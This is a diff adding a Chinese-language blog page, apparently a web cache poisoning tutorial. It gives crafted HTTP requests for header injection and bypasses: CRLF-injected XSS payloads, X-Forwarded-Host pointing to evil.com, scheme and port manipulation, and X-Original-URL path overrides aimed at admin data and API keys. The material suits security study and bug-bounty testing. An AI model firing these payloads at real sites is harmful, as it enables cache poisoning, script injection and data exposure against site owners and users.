@@ -1,0 +1,1034 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/admin.jpg">
+  <link rel="icon" href="/img/admin.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="xiaobite">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="缓存投毒 - 1 有效漏洞配置有漏洞的配置： 12# 不安全的 Header 反射response.headers[&#x27;X-Custom&#x27;] &#x3D; request.headers.get(&#x27;X-Custom&#x27;)  利用： 123GET &#x2F; HTTP&#x2F;1.1Host: target.comX-Custom: value\r\n\r\n&lt;script&gt;a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="缓存投毒 - 1">
+<meta property="og:url" content="https://xiaobite-hacker.github.io/2026/05/02/%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92-1/index.html">
+<meta property="og:site_name" content="xiaobite">
+<meta property="og:description" content="缓存投毒 - 1 有效漏洞配置有漏洞的配置： 12# 不安全的 Header 反射response.headers[&#x27;X-Custom&#x27;] &#x3D; request.headers.get(&#x27;X-Custom&#x27;)  利用： 123GET &#x2F; HTTP&#x2F;1.1Host: target.comX-Custom: value\r\n\r\n&lt;script&gt;a">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-05-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-05-02T08:01:40.154Z">
+<meta property="article:author" content="xiaobite">
+<meta property="article:tag" content="缓存投毒">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>缓存投毒 - 1 - xiaobite</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xiaobite-hacker.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>xiaobite</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/prompt/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>prompt</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="缓存投毒 - 1"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-05-02 00:00" pubdate>
+          2026年5月2日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          28 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">缓存投毒 - 1</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="缓存投毒-1"><a href="#缓存投毒-1" class="headerlink" title="缓存投毒 - 1"></a>缓存投毒 - 1</h1><hr>
+<h3 id="有效漏洞配置"><a href="#有效漏洞配置" class="headerlink" title="有效漏洞配置"></a>有效漏洞配置</h3><p><strong>有漏洞的配置：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 不安全的 Header 反射</span><br>response.headers[<span class="hljs-string">&#x27;X-Custom&#x27;</span>] = request.headers.get(<span class="hljs-string">&#x27;X-Custom&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><strong>利用：</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Custom</span><span class="hljs-punctuation">: </span>value\r\n\r\n&lt;script&gt;alert(document.domain)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p><strong>缓存的响应：</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">X-Custom</span><span class="hljs-punctuation">: </span>value<br>&lt;script&gt;alert(document.domain)&lt;/script&gt;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html<br>...<br></code></pre></td></tr></table></figure>
+
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="1：通过-URL-编码的-Header-注入"><a href="#1：通过-URL-编码的-Header-注入" class="headerlink" title="1：通过 URL 编码的 Header 注入"></a>1：通过 URL 编码的 Header 注入</h4><p>某些解析器对 Header 的解码方式不同：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-Host: target.com%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aContent-Length:%<span class="hljs-number">200</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aHTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">20200</span>%<span class="hljs-number">20</span>OK%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure>
+
+<h4 id="2：HTTP-2-Header-拆分"><a href="#2：HTTP-2-Header-拆分" class="headerlink" title="2：HTTP&#x2F;2 Header 拆分"></a>2：HTTP&#x2F;2 Header 拆分</h4><p>HTTP&#x2F;2 不使用 <code>\r\n</code>，但后端可能会转换它：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-meta">:path:</span> /<br>x-custom: value\r\nSet-Cookie: admin=true<br></code></pre></td></tr></table></figure>
+
+<p><strong>原理</strong>：某些 HTTP&#x2F;2 到 HTTP&#x2F;1.1 的转换器没有正确清理 Header。</p>
+<h4 id="3：通过响应拆分的缓存欺骗"><a href="#3：通过响应拆分的缓存欺骗" class="headerlink" title="3：通过响应拆分的缓存欺骗"></a>3：通过响应拆分的缓存欺骗</h4><p>结合路径混淆：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/profile/..%2f..%2fstatic%2fstyle.css</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>evil.com\r\nX-Cache-Poisoned: true<br></code></pre></td></tr></table></figure>
+
+<p><strong>结果</strong>：个人资料数据被缓存为静态 CSS 文件。</p>
+<hr>
+<h2 id="一-Header-转发"><a href="#一-Header-转发" class="headerlink" title="一. Header 转发"></a>一. Header 转发</h2><h3 id="X-Forwarded-Host："><a href="#X-Forwarded-Host：" class="headerlink" title="X-Forwarded-Host："></a>X-Forwarded-Host：</h3><h4 id="1：双重解析绕过"><a href="#1：双重解析绕过" class="headerlink" title="1：双重解析绕过"></a>1：双重解析绕过</h4><p>某些应用解析 <code>X-Forwarded-Host</code> 两次——一次在 CDN 层，一次在应用层。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/user/profile</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>legitimate.target.com, evil.com<br></code></pre></td></tr></table></figure>
+
+
+<ul>
+<li>CDN 读取第一个值：<code>legitimate.target.com</code> ✅ 允许</li>
+<li>应用读取最后一个值：<code>evil.com</code> ⚠️ 已注入</li>
+<li>缓存键使用：第一个值（CDN 的决定）</li>
+<li>响应反射：最后一个值（应用的决定）</li>
+</ul>
+<p><strong>真实案例</strong>：此模式类似于 <a target="_blank" rel="noopener" href="https://hackerone.com/reports/487">HackerOne 报告 #487</a> 中发现的情况，这是在 HackerOne 本身发现的最早的缓存投毒漏洞之一，其中 <code>X-Forwarded-Host</code> Header 在没有验证的情况下被信任。</p>
+<h4 id="2：端口注入绕过"><a href="#2：端口注入绕过" class="headerlink" title="2：端口注入绕过"></a>2：端口注入绕过</h4><p>WAF 通常检查 <code>X-Forwarded-Host</code> 是否匹配允许的域名，但忘记了端口规范。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>target.com:@attacker.com<br></code></pre></td></tr></table></figure>
+
+
+<ul>
+<li>浏览器将 <code>target.com:@attacker.com</code> 解释为以 <code>target.com:</code> 为用户名的 <code>attacker.com</code></li>
+<li>WAF 看到 “target.com” 子串并允许它</li>
+<li>生成的 URL 变为：<code>https://target.com:@attacker.com/path</code></li>
+</ul>
+<p><strong>真实案例</strong>：类似技术记录在 <a target="_blank" rel="noopener" href="https://hackerone.com/reports/977851">Shopify 的缓存投毒报告 #977851</a> 中，其中 <code>X-Forwarded-Host</code> 被利用来投毒缓存页面。</p>
+<h4 id="3：Unicode-同形字混淆"><a href="#3：Unicode-同形字混淆" class="headerlink" title="3：Unicode 同形字混淆"></a>3：Unicode 同形字混淆</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>tаrget.com<br></code></pre></td></tr></table></figure>
+
+<p>注意西里尔字母 ‘а’（U+0430）代替拉丁字母 ‘a’。某些应用规范化 Unicode 而缓存不这样做，创建键碰撞。</p>
+<p><strong>测试策略</strong> — 测试这些 Unicode 看起来相似的字符：</p>
+<ul>
+<li>拉丁 ‘a’ vs 西里尔 ‘а’（U+0430）</li>
+<li>拉丁 ‘o’ vs 西里尔 ‘о’（U+043E）</li>
+<li>拉丁 ‘e’ vs 西里尔 ‘е’（U+0435）</li>
+<li>拉丁 ‘p’ vs 西里尔 ‘р’（U+0440）</li>
+</ul>
+<h3 id="X-Forwarded-Scheme：协议操纵"><a href="#X-Forwarded-Scheme：协议操纵" class="headerlink" title="X-Forwarded-Scheme：协议操纵"></a>X-Forwarded-Scheme：协议操纵</h3><p>此 Header 告诉后端客户端使用的协议。它应该由 CDN 设置，但许多应用盲目信任它。</p>
+<h4 id="1：强制-HTTPS-降级"><a href="#1：强制-HTTPS-降级" class="headerlink" title="1：强制 HTTPS 降级"></a>1：强制 HTTPS 降级</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/checkout</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Forwarded-Scheme</span><span class="hljs-punctuation">: </span>http<br><span class="hljs-attribute">X-Forwarded-Proto</span><span class="hljs-punctuation">: </span>http<br></code></pre></td></tr></table></figure>
+
+<p><strong>影响：</strong></p>
+<ul>
+<li>应用生成 http:&#x2F;&#x2F; 而非 https:&#x2F;&#x2F; 的 URL</li>
+<li>没有 Secure 标志的 Cookie 变得可访问</li>
+<li>用户出现混合内容警告</li>
+<li>某些配置下绕过 HSTS</li>
+</ul>
+<p><strong>真实案例</strong>：在 <a target="_blank" rel="noopener" href="https://youst.in/posts/cache-poisoning-at-scale/">Youstin 的”大规模缓存投毒”研究</a> 中，<code>X-Forwarded-Scheme</code> Header 被成功用于在 Ruby on Rails 应用上造成重定向循环，获得多个赏金，包括 HackerOne 的 $2,500。</p>
+<h4 id="2：协议混淆链"><a href="#2：协议混淆链" class="headerlink" title="2：协议混淆链"></a>2：协议混淆链</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/redirect</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Forwarded-Scheme</span><span class="hljs-punctuation">: </span>javascript<br><span class="hljs-attribute">X-Forwarded-Proto</span><span class="hljs-punctuation">: </span>javascript<br></code></pre></td></tr></table></figure>
+
+<p>如果应用盲目信任这些 Header：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 有漏洞的代码</span><br><span class="hljs-keyword">const</span> protocol = req.<span class="hljs-property">headers</span>[<span class="hljs-string">&#x27;x-forwarded-scheme&#x27;</span>];<br><span class="hljs-keyword">const</span> redirectUrl = <span class="hljs-string">`<span class="hljs-subst">$&#123;protocol&#125;</span>://target.com/safe-page`</span>;<br><span class="hljs-comment">// 结果：javascript://target.com/safe-page</span><br></code></pre></td></tr></table></figure>
+
+<p>当 URL 用于重定向或 href 属性时，这会创建 XSS 向量。</p>
+<h3 id="X-Forwarded-Port：覆盖被遗忘的端口"><a href="#X-Forwarded-Port：覆盖被遗忘的端口" class="headerlink" title="X-Forwarded-Port：覆盖被遗忘的端口"></a>X-Forwarded-Port：覆盖被遗忘的端口</h3><p>此 Header 指定客户端连接的端口。应用将其用于 URL 生成，这就是事情变得有趣的地方。</p>
+<h4 id="1：基于端口的缓存投毒"><a href="#1：基于端口的缓存投毒" class="headerlink" title="1：基于端口的缓存投毒"></a>1：基于端口的缓存投毒</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/assets/app.js</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Forwarded-Port</span><span class="hljs-punctuation">: </span>8080<br></code></pre></td></tr></table></figure>
+
+<p><strong>场景：</strong></p>
+<ul>
+<li>应用生成资源 URL：<code>https://target.com:8080/assets/app.js</code></li>
+<li>普通用户无法加载这些 URL（端口 8080 未暴露）</li>
+<li>由于缺少 JavaScript，整个应用崩溃</li>
+</ul>
+<p><strong>真实案例</strong>：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/409370">HackerOne 报告 #409370</a> 演示了 <code>X-Forwarded-Port</code> 如何通过将用户重定向到无效端口，在 HackerOne.com 本身造成 DoS。</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-attribute">X-Forwarded-Port</span>: <span class="hljs-number">80</span><span class="hljs-variable">@evil</span>.<span class="hljs-attribute">com</span>:<span class="hljs-number">443</span><br></code></pre></td></tr></table></figure>
+<p>根据 URL 解析，这可能生成：<code>https://target.com:80@evil.com:443/path</code></p>
+<h3 id="Forwarded-Header：RFC-7239-利用"><a href="#Forwarded-Header：RFC-7239-利用" class="headerlink" title="Forwarded Header：RFC 7239 利用"></a>Forwarded Header：RFC 7239 利用</h3><p>当所有人都在测试 <code>X-Forwarded-*</code> 时，标准化的 <code>Forwarded</code> Header（定义在 <a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc7239">RFC 7239</a> 中）经常被忽视。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">Forwarded</span><span class="hljs-punctuation">: </span>for=1.2.3.4;host=evil.com;proto=http<br></code></pre></td></tr></table></figure>
+
+
+<ul>
+<li>更结构化的格式可以绕过简单的正则过滤器</li>
+<li>一个 Header 中包含多个参数</li>
+<li>可以混合合法和恶意值</li>
+</ul>
+<h4 id="1：参数注入"><a href="#1：参数注入" class="headerlink" title="1：参数注入"></a>1：参数注入</h4><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Forwarded: host<span class="hljs-operator">=</span><span class="hljs-keyword">target</span>.com<span class="hljs-comment">;host=evil.com</span><br></code></pre></td></tr></table></figure>
+
+<p>应用可能取第一个 host 值进行验证，取第二个用于 URL 生成。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Forwarded: <span class="hljs-attribute">host</span>=<span class="hljs-string">&quot;evil.com&quot;</span><br>Forwarded: <span class="hljs-attribute">host</span>=evil.com:443<br>Forwarded: host=[::1]:evil.com<br>Forwarded: <span class="hljs-attribute">proto</span>=https;host=evil.com;proto=http<br></code></pre></td></tr></table></figure>
+
+<h2 id="二-URL-操纵-Header"><a href="#二-URL-操纵-Header" class="headerlink" title="二. URL 操纵 Header"></a>二. URL 操纵 Header</h2><h3 id="X-Original-URL：IIS"><a href="#X-Original-URL：IIS" class="headerlink" title="X-Original-URL：IIS"></a>X-Original-URL：IIS</h3><p>此 Header 专为 IIS URL 重写设计，但现在被许多框架处理。它极其强大，因为它可以覆盖整个请求路径。</p>
+<h4 id="1：路径覆盖缓存投毒"><a href="#1：路径覆盖缓存投毒" class="headerlink" title="1：路径覆盖缓存投毒"></a>1：路径覆盖缓存投毒</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/public/cached-page</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Original-URL</span><span class="hljs-punctuation">: </span>/admin/sensitive-data<br></code></pre></td></tr></table></figure>
+
+
+<ul>
+<li>缓存键基于：<code>/public/cached-page</code> 生成</li>
+<li>应用处理：<code>/admin/sensitive-data</code></li>
+<li>管理员响应被缓存在公开端点</li>
+</ul>
+<p><strong>真实案例</strong>：James Kettle 的研究在 <a target="_blank" rel="noopener" href="https://portswigger.net/research/web-cache-entanglement">“Web Cache Entanglement”</a> 中记录了类似的路径覆盖攻击，路径操纵在多个平台上导致了关键漏洞。</p>
+<h4 id="2：通过路径混淆的认证绕过"><a href="#2：通过路径混淆的认证绕过" class="headerlink" title="2：通过路径混淆的认证绕过"></a>2：通过路径混淆的认证绕过</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/v1/users</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Original-URL</span><span class="hljs-punctuation">: </span>/api/v2/admin/users<br></code></pre></td></tr></table></figure>
+
+<p>如果认证基于路径且仅检查实际请求路径，这就能绕过它。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/static/image.png</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Original-URL</span><span class="hljs-punctuation">: </span>/api/internal/keys<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>image/png<br></code></pre></td></tr></table></figure>
+
+<p>缓存认为它在提供图片。应用返回 API 密钥。</p>
+<h3 id="X-Rewrite-URL：Apache"><a href="#X-Rewrite-URL：Apache" class="headerlink" title="X-Rewrite-URL：Apache"></a>X-Rewrite-URL：Apache</h3><p>类似于 <code>X-Original-URL</code>，但某些框架的处理方式不同。</p>
+<h4 id="1：双重路径处理"><a href="#1：双重路径处理" class="headerlink" title="1：双重路径处理"></a>1：双重路径处理</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/public</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Rewrite-URL</span><span class="hljs-punctuation">: </span>/admin<br><span class="hljs-attribute">X-Original-URL</span><span class="hljs-punctuation">: </span>/public<br></code></pre></td></tr></table></figure>
+
+<p><strong>测试优先级</strong> — 不同框架有不同的 Header 优先级：</p>
+<ul>
+<li>Apache mod_rewrite：<code>X-Rewrite-URL</code> 优先</li>
+<li>IIS：<code>X-Original-URL</code> 优先</li>
+<li>Nginx：默认都不使用（自定义配置）</li>
+<li>Express.js：取决于中间件顺序</li>
+</ul>
+<p><strong>Tip</strong>：始终同时和单独测试两个 Header。框架更新会改变优先级。</p>
+<h3 id="X-Forwarded-Prefix：路径前缀"><a href="#X-Forwarded-Prefix：路径前缀" class="headerlink" title="X-Forwarded-Prefix：路径前缀"></a>X-Forwarded-Prefix：路径前缀</h3><p>此 Header 为所有生成的 URL 添加前缀。它适用于在子目录中运行的反向代理后面的应用。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/users</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Forwarded-Prefix</span><span class="hljs-punctuation">: </span>../../evil<br></code></pre></td></tr></table></figure>
+
+<p><strong>生成的 URL：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../evil/assets/style.css&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../evil/js/app.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>影响：</strong></p>
+<ul>
+<li>资源 URL 中的相对路径遍历</li>
+<li>可以指向攻击者控制的子域名</li>
+<li>如果实施不当会破坏 CSP</li>
+</ul>
